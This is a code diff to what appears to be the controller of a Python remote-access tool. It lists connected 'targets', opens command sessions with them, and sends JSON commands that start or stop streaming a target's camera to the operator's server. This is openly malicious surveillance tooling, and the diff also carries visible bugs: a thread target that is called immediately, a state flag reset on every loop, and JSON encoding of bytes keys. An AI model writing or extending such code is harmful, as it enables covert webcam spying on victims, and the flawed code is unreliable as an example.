@@ -7,6 +7,7 @@ import threading
 import pandas
 from prettytable import PrettyTable
 import time
+import json
 #from assets.colors import colors
 #from assets.symbols import *
 
@@ -41,11 +42,11 @@ def StartCameraStreamingServer(host, port):
     global CAMERA_STREAMING    
     CAMERA_STREAMING = StreamingServer(host, port)
     CAMERA_STREAMING_THREAD = threading.Thread(
-                    target=CAMERA_STREAMING.start_stream()
+                    target=CAMERA_STREAMING.start_server()
             )
     CAMERA_STREAMING_THREAD.start()
 def StopCameraStreamingServer() :
-    CAMERA_STREAMING.stop_stream()
+    CAMERA_STREAMING.stop_server()
 
 def TARGETS_SHOWER():
     TARGET_TABLE = PrettyTable([f"{CR.red()}ip{CR.white()}", f"{CR.red()}port{CR.white()}"])
@@ -55,15 +56,18 @@ def TARGETS_SHOWER():
 
 def connect_with_host(target_add):
     SESSION_START_STR = "session start"
+    SERVER_UP = False
+    print(f"{Splus} {CR.green()}Connected to {CR.red()}{TARGETS[target_add][0]}{CR.white()}")
     while True:
         SERVER_UP = False
-        print(f"{Splus} {CR.green()}Connected to {CR.red()}{TARGETS[target_add][0]}{CR.white()}")
         COMMAND_FOR_TARGET_SESSION = input(f"\r   {CR.red()} <|{CR.green()}SESSION{CR.yellow()}target={TARGETS[target_add][0]}{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
         if COMMAND_FOR_TARGET_SESSION == "start stream":
+            if SERVER_UP:
+                print(f"{Sminess} {CR.red()}Stream is already up{CR.white()}")
             JSON_MSG = {
-                b"command" : b"start stream"
+                "command" : "start stream"
             }
-            target_add.send(JSON_MSG)
+            target_add.send(json.dumps(JSON_MSG).encode())
             time.sleep(0.4)
             StartCameraStreamingServer(
                 host=HOST,
@@ -71,16 +75,16 @@ def connect_with_host(target_add):
             )
             SERVER_UP = True
         elif COMMAND_FOR_TARGET_SESSION == "stop stream":
-            if SERVER_UP:
+            if SERVER_UP == False:
                 print(f"{Sminess} {CR.red()}Stream isn't up to stop it {CR.white()}")
             else:
                 JSON_MSG_TO_STOP_STREAM = {
-                    b"command" : b"stop stream"
+                    "command".encode() : "stop stream".encode()
                 }
-                target_add.send(JSON_MSG_TO_STOP_STREAM)
-                time.sleep(0.1)
+                target_add.send(json.dumps(JSON_MSG_TO_STOP_STREAM).encode())
                 StopCameraStreamingServer()
                 print(f"{Splus} {CR.green()}Stream stoped{CR.white()}")
+                SERVER_UP = False
         elif COMMAND_FOR_TARGET_SESSION == "back to server":
             break
         
